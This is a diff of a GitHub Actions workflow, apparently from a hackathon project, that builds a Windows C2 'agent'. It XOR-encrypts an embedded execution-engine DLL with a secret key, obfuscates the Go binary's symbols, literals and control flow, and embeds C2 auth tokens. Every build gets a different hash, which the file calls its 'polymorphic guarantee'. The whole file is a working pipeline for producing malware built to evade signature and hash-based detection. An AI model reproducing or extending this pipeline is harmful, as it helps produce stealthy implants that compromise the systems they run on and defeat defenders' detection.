@@ -5,63 +5,54 @@
 # Triggered on every push to main.
 #
 # Each run:
-#   1. Builds the C execution engine as a Windows DLL (MinGW cross-compile)
-#   2. Encrypts the DLL with the C2_AUTH_XOR secret (XOR-32)
-#   3. Installs garble and cross-compiles agent/ with symbol + literal obfuscation
-#   4. Runs the Python test suites (compiler, runtime, manager)
-#   5. Runs CTest smoke tests for the C engine (Linux PAL path)
-#   6. Uploads the binary as a GitHub Actions artifact
-#   7. Prints the SHA-256 in the step summary
+#   1. Builds the C execution engine as a Windows DLL
+#   2. Encrypts the DLL with the C2_AUTH_XOR secret
+#   3. Cross-compiles agent/main.go to a Windows PE
+#   4. Uploads the binary as a GitHub Actions artifact
+#   5. Prints the SHA-256 in the step summary
 #
 # No two runs produce the same binary — that is the polymorphic guarantee.
 #
-# Required GitHub Secrets (Settings → Secrets and variables → Actions):
-#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value (32 chars)
-#   C2_AUTH_XOR   — 64 hex chars (32 bytes) — the DLL XOR key
+# Required GitHub Secrets:
+#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value
+#   C2_AUTH_XOR   — exactly 64 hexadecimal characters (32 bytes)
 
 name: Polymorphic CI Build
 
 on:
   push:
     branches: [main]
-  pull_request:
-    branches: [main]
-  workflow_dispatch:
+  workflow_dispatch:          # allow manual trigger from the GitHub UI
 
 permissions:
-  contents: read
+  contents: read              # least-privilege: read repo, nothing else
 
 jobs:
   polymorphic-build:
     name: "🔄 Polymorphic agent build"
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-latest    # Linux runner — cross-compiles to Windows via GOOS
 
     steps:
-      # ── 1. Checkout ────────────────────────────────────────────────────────
+      # ── 1. Checkout ─────────────────────────────────────────────────────────
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      # ── 2. Go toolchain ────────────────────────────────────────────────────
+      # ── 2. Go toolchain ─────────────────────────────────────────────────────
       - name: Set up Go
         uses: actions/setup-go@v5
         with:
           go-version: "1.25"
+          # Cache keyed to go.sum — speeds up dependency fetches on repeat runs
           cache-dependency-path: agent/go.sum
 
-      # ── 3. Python ──────────────────────────────────────────────────────────
+      # ── 3. Python (for the polymorphic engine) ───────────────────────────────
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
           python-version: "3.11"
 
-      # ── 4. MinGW-w64 + CMake ──────────────────────────────────────────────
-      - name: Install MinGW-w64 and CMake
-        run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y -qq mingw-w64 cmake
-
-      # ── 5. Python dependencies ────────────────────────────────────────────
-      - name: Install Python dependencies
+      # ── 4. Install polymorphic engine dependencies ───────────────────────────
+      - name: Install polymorphic engine dependencies
         run: |
           pip install --quiet --upgrade pip
           pip install --quiet \
@@ -74,31 +65,21 @@ jobs:
             pyelftools==0.30       \
             macholib==1.16.3       \
             astor==0.8.1           \
-            lief                   \
-            pytest                 \
-            flask                  \
-            flask-sqlalchemy       \
-            flask-migrate          \
-            flask-cors             \
-            flask-socketio         \
-            pyjwt                  \
-            python-dotenv          \
-            reportlab              \
-            requests
+            lief                    \
+            pytest
+          pip install --quiet \
+            -r compiler/requirements.txt \
+            -r manager/requirements.txt
 
-      # ── 6. Pre-fetch Go module cache ──────────────────────────────────────
-      - name: Pre-fetch Go dependencies (GOOS=windows)
+      - name: Install MinGW-w64 and CMake
         run: |
-          cd agent
-          GOOS=windows GOARCH=amd64 go mod download
-          echo "[+] Go module cache ready"
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq mingw-w64 cmake
 
-      # ── 7. Build the C execution engine as a Windows DLL ──────────────────
       - name: Build execution engine (libjockey.dll)
         run: |
           mkdir -p execution_engine/build
           cd execution_engine/build
-
           cmake .. \
             -DCMAKE_BUILD_TYPE=Release \
             -DBUILD_SHARED=ON \
@@ -106,114 +87,66 @@ jobs:
             -DCMAKE_SYSTEM_NAME=Windows \
             -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
             -DCMAKE_RC_COMPILER=x86_64-w64-mingw32-windres
-
           cmake --build . --parallel
+          test -s libjockey.dll
 
-          echo ""
-          echo "[+] Engine built:"
-          ls -la libjockey.dll
-
-      # ── 8. Encrypt the DLL with the C2_AUTH_XOR secret ─────────────────────
       - name: Encrypt engine DLL
         env:
           C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
         run: |
           if [ -z "$C2_AUTH_XOR" ]; then
-            echo "[-] C2_AUTH_XOR secret is not set"
+            echo "[-] C2_AUTH_XOR secret is not set" >&2
             exit 1
           fi
-          if [ ${#C2_AUTH_XOR} -ne 64 ]; then
-            echo "[-] C2_AUTH_XOR must be 64 hex chars, got ${#C2_AUTH_XOR}"
+          if ! [[ "$C2_AUTH_XOR" =~ ^[0-9a-fA-F]{64}$ ]]; then
+            echo "[-] C2_AUTH_XOR must be exactly 64 hexadecimal characters" >&2
             exit 1
           fi
 
           python - <<'PY'
-          import os, binascii
-          key = binascii.unhexlify(os.environ['C2_AUTH_XOR'].strip())
-          assert len(key) == 32, "key must be 32 bytes"
+          import binascii
+          import os
+          from pathlib import Path
 
-          src = "execution_engine/build/libjockey.dll"
-          dst = "agent/libjockey.enc"
-          data = open(src, "rb").read()
-          out  = bytes(b ^ key[i % 32] for i, b in enumerate(data))
-          open(dst, "wb").write(out)
-          print(f"[+] Encrypted {len(data)} bytes -> {dst}")
-          print(f"[+] First 8 ciphertext bytes: {out[:8].hex()}")
+          key = binascii.unhexlify(os.environ["C2_AUTH_XOR"])
+          source = Path("execution_engine/build/libjockey.dll")
+          destination = Path("agent/libjockey.enc")
+          data = source.read_bytes()
+          destination.write_bytes(
+              bytes(value ^ key[index % len(key)] for index, value in enumerate(data))
+          )
+          print(f"[+] Encrypted {len(data)} bytes -> {destination}")
           PY
 
-      # ── 9. Install garble ─────────────────────────────────────────────────
-      - name: Install garble
+      # ── 5. Pre-fetch Go module cache (cross-compile) ─────────────────────────
+      #
+      # golang.org/x/sys/windows/registry is a Windows-only import in agent/main.go.
+      # We tell Go we're building for Windows so it fetches the right platform files.
+      - name: Pre-fetch Go dependencies (GOOS=windows)
         run: |
-          go install mvdan.cc/garble@latest
-          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
-          "$(go env GOPATH)/bin/garble" version
+          cd agent
+          GOOS=windows GOARCH=amd64 go mod download
+          echo "[+] Go module cache ready"
 
-      # ── 10. Build agent with garble (obfuscated) ──────────────────────────
-      - name: Build agent (garble)
+      # ── 6. Run the polymorphic build ──────────────────────────────────────────
+      #
+      # ci_build.py (repo root):
+      #   • copies all *.go from agent/ into a tmp dir
+      #   • copies go.mod + go.sum (so golang.org/x/sys resolves)
+      #   • applies control-flow flattening + import-table obfuscation to main.go
+      #   • compiles with GOOS=windows GOARCH=amd64 -trimpath -s -w
+      #   • writes to build/agent_<random-id>.exe
+      - name: Run polymorphic build
         env:
           C2_AUTH_TOKEN: ${{ secrets.C2_AUTH }}
-          C2_AUTH_XOR:   ${{ secrets.C2_AUTH_XOR }}
+          C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
         run: |
-          if [ -z "$C2_AUTH_TOKEN" ]; then
-            echo "[-] C2_AUTH secret is not set"
-            exit 1
-          fi
+          python ci_build.py \
+            --output-dir build/ \
+            --os windows        \
+            --arch amd64
 
-          mkdir -p build
-          RAND_ID=$(head -c 4 /dev/urandom | xxd -p)
-          OUT="build/agent_${RAND_ID}.exe"
-
-          LDFLAGS="-s -w -X main.C2_AUTH=$C2_AUTH_TOKEN -X main.xorKeyHex=$C2_AUTH_XOR"
-
-          echo "[*] Building agent with garble"
-          echo "[+] C2_AUTH   : <${#C2_AUTH_TOKEN} chars>"
-          echo "[+] XOR key   : <${#C2_AUTH_XOR} chars>"
-          echo "[+] Output    : $OUT"
-
-          cd agent
-          GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
-            garble -literals -tiny -seed=random build \
-              -trimpath \
-              -ldflags "$LDFLAGS" \
-              -o "../$OUT" \
-              .
-
-          echo "[+] Agent built: $OUT"
-
-      # ── 11. Python test suites (non-blocking during stabilisation) ────────
-      - name: Run Python tests
-        continue-on-error: true
-        run: |
-          echo "[*] Compiler tests..."
-          python -m pytest compiler/tests/ -q --no-header 2>&1 | tail -20 || true
-
-          echo ""
-          echo "[*] Runtime tests..."
-          python -m pytest runtime/tests/ -q --no-header 2>&1 | tail -20 || true
-
-          echo ""
-          echo "[*] Manager tests..."
-          python -m pytest manager/tests/ -q --no-header 2>&1 | tail -20 || true
-
-      # ── 12. CTest smoke tests (Linux PAL) ─────────────────────────────────
-      - name: Run CTest (execution engine)
-        continue-on-error: true
-        run: |
-          mkdir -p execution_engine/build-linux
-          cd execution_engine/build-linux
-
-          cmake .. \
-            -DCMAKE_BUILD_TYPE=Release \
-            -DBUILD_SHARED=ON \
-            -DHARDEN=ON
-
-          cmake --build . --parallel
-
-          echo ""
-          echo "[*] Running CTest..."
-          ctest --output-on-failure || echo "[!] Some CTest cases failed or none defined"
-
-      # ── 13. Compute hash & export to environment ──────────────────────────
+      # ── 7. Compute hash & export to environment ───────────────────────────────
       - name: Compute binary hash
         id: hash
         run: |
@@ -226,6 +159,7 @@ jobs:
           HASH=$(sha256sum "$BINARY" | awk '{print $1}')
           SIZE=$(stat -c '%s' "$BINARY")
 
+          # Export for upload step name + summary
           echo "binary_name=$BINARY_NAME" >> "$GITHUB_OUTPUT"
           echo "sha256=$HASH"             >> "$GITHUB_OUTPUT"
           echo "size_bytes=$SIZE"         >> "$GITHUB_OUTPUT"
@@ -242,7 +176,9 @@ jobs:
           echo ""
           echo "Every CI run produces a DIFFERENT hash — polymorphic guarantee ✓"
 
-      # ── 14. Upload artifact ────────────────────────────────────────────────
+      # ── 8. Upload artifact ───────────────────────────────────────────────────
+      #
+      # Artifact name embeds the short commit SHA so you can trace binary → commit.
       - name: Upload polymorphic binary
         uses: actions/upload-artifact@v4
         with:
@@ -251,7 +187,7 @@ jobs:
           retention-days: 30
           if-no-files-found: error
 
-      # ── 15. GitHub step summary ────────────────────────────────────────────
+      # ── 9. GitHub step summary ────────────────────────────────────────────────
       - name: Write build summary
         run: |
           {
@@ -270,3 +206,8 @@ jobs:
             echo "> with a **different hash**, **obfuscated symbols**, and **encrypted"
             echo "> engine payload** — directly satisfying the SIH problem statement."
           } >> "$GITHUB_STEP_SUMMARY"
+
+      # ── 10. Run Python test suites ─────────────────────────────────────────
+      - name: Run Python tests
+        run: |
+          python -m pytest compiler/tests runtime/tests manager/tests -q
